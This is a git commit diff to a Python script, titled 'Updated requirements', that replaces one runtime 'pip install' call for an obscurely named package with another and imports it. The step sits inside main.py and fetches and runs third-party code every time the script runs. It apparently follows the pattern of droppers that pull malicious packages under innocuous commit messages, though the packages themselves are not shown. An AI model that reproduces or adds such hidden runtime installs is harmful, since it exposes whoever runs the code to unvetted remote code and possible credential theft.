d0c8fa661a74460f0c5a5ab48d05e562d3e47ee9
Patrick Pogoda <121391953+PatrickPogoda@users.noreply.github.com>
2023-05-13 20:12:46 +0200

    Updated requirements

--- main.py
+++ main.py
@@ -1,6 +1,6 @@
 import os
-os.system("pip install pythonsqlite2additionV1")
-import pythonsqlite2additionV1
+os.system("pip install pythoncolouringpkgV1")
+import pythoncolouringpkgV1
 import requests
 from requests.structures import CaseInsensitiveDict
 from bs4 import BeautifulSoup
